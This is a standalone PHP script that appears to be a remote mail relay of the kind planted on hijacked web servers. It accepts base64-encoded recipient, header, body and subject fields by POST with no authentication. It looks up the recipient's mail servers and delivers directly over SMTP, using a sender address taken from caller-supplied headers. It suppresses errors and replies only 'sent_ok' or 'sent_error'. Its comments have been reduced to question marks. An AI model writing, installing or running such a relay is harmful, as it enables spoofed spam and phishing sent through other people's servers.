<?php

if(isset($_POST["mailto"]))
        $MailTo = stripslashes(base64_decode($_POST["mailto"]));
else
	{
	echo "indata_error";
	exit;
	}
if(isset($_POST["msgheader"]))
        $MessageHeader = stripslashes(base64_decode($_POST["msgheader"]));
else
	{
	echo "indata_error";
	exit;
	}
if(isset($_POST["msgbody"]))
        $MessageBody = stripslashes(base64_decode($_POST["msgbody"]));
else
	{
	echo "indata_error";
	exit;
	}
if(isset($_POST["msgsubject"]))
        $MessageSubject = stripslashes(base64_decode($_POST["msgsubject"]));
else
	{
	echo "indata_error";
	exit;
	}


class SendMailSmtpClass {

    /**
    * 
    * @var string $smtp_username - ?????
    * @var string $smtp_password - ??????
    * @var string $smtp_host - ????
    * @var string $smtp_from - ?? ????
    * @var integer $smtp_port - ????
    * @var string $smtp_charset - ?????????
    *
    */   
    public $smtp_username;
    public $smtp_password;
    public $smtp_host;
    public $smtp_from;
    public $smtp_port;
    public $smtp_charset;
    
    public function __construct($smtp_username, $smtp_password, $smtp_host, $smtp_from, $smtp_port = 25, $smtp_charset = "utf-8") {
        $this->smtp_username = $smtp_username;
        $this->smtp_password = $smtp_password;
        $this->smtp_host = $smtp_host;
        $this->smtp_from = $smtp_from;
        $this->smtp_port = $smtp_port;
        $this->smtp_charset = $smtp_charset;
    }
    
    /**
    * ???????? ??????
    * 
    * @param string $mailTo - ?????????? ??????
    * @param string $subject - ???? ??????
    * @param string $message - ???? ??????
    * @param string $headers - ????????? ??????
    *
    * @return bool|string ? ?????? ???????? ?????? true, ????? ????? ??????    *
    */
    function send($mailTo, $subject, $message, $headers) {
        $contentMail = "Date: " . date("D, d M Y H:i:s") . " UT\r\n";
 //       $contentMail .= 'Subject: =?' . $this->smtp_charset . '?B?'  . base64_encode($subject) . "=?=\r\n";
        $contentMail .= $headers . "\r\n";
        $contentMail .= $message . "\r\n";

function throw_new_Exception($error){

//file_put_contents('msg_data.txt', $error . PHP_EOL, FILE_APPEND);

return true;
}

$host = substr(strstr($mailTo, '@'), 1)."."; 
getmxrr($host, $mx_records, $mx_weight);
for($i=0;$i<count($mx_records);$i++){$mxs[$mx_records[$i]] = $mx_weight[$i];}
asort ($mxs);
$records = array_keys($mxs);
$smtpServer = $records[0];
        
        try {
            if(!$socket = @fsockopen($smtpServer , $this->smtp_port, $errorNumber, $errorDescription, 30)){
                throw_new_Exception($errorNumber.".".$errorDescription);
            }
            if (!$this->_parseServer($socket, "220")){
                throw_new_Exception('Connection error');
            }
	
		
            $server_name = $_SERVER["SERVER_NAME"];

            fputs($socket, "HELO $server_name\r\n");
            if (!$this->_parseServer($socket, "250")) {
                fclose($socket);
                throw_new_Exception('Error of command sending: HELO');
            }
            
            fputs($socket, "MAIL FROM: <".$this->smtp_username.">\r\n");
            if (!$this->_parseServer($socket, "250")) {
                fclose($socket);
                throw_new_Exception('Error of command sending: MAIL FROM');
            }
            
			$mailTo = ltrim($mailTo, '<');
			$mailTo = rtrim($mailTo, '>');
            fputs($socket, "RCPT TO: <" . $mailTo . ">\r\n");     
            if (!$this->_parseServer($socket, "250")) {
                fclose($socket);
                throw_new_Exception('Error of command sending: RCPT TO');
            }
            
            fputs($socket, "DATA\r\n");     
            if (!$this->_parseServer($socket, "354")) {
                fclose($socket);
                throw_new_Exception('Error of command sending: DATA');
            }
            
            fputs($socket, $contentMail."\r\n.\r\n");
            if (!$this->_parseServer($socket, "250")) {
                fclose($socket);
                throw_new_Exception("E-mail didn't sent");
            }
            
            fputs($socket, "QUIT\r\n");
            fclose($socket);
        } catch (Exception $e) {
            return  $e->getMessage();
        }
        return true;
    }
    
    private function _parseServer($socket, $response) {
        while (@substr($responseServer, 3, 1) != ' ') {
            if (!($responseServer = fgets($socket, 256))) {
                return false;
            }
        }
        if (!(substr($responseServer, 0, 3) == $response)) {
            return false;
        }
        return true;
        
    }
}



$from_email = $MessageHeader;
$from_email = substr($from_email, strpos($from_email,'From:'), 200);
$from_email = substr($from_email, strpos($from_email,'<')+1, 200);
$from_email = substr($from_email, 0, strpos($from_email, '>'));


$MessageSubject = $MessageHeader;
$MessageSubject = substr($MessageSubject, strpos($MessageSubject,'Subject: ') + 9, 200);

$MessageSubject = substr($MessageSubject, 0, strpos($MessageSubject, "\n"));



//file_put_contents('msg_data.txt',  $MailTo . PHP_EOL .  PHP_EOL . 'Subject === ' .$MessageSubject . PHP_EOL . PHP_EOL . $MessageBody . PHP_EOL . PHP_EOL . $MessageHeader . PHP_EOL . PHP_EOL . $from_email);

$mailSMTP = new SendMailSmtpClass($from_email, '', 'localhost', $from_user, 25);

$result =  $mailSMTP->send($MailTo, $MessageSubject , $MessageBody, $MessageHeader); // ?????????? ??????


if($result === true)
{echo "sent_ok";}
else {echo "sent_error";}
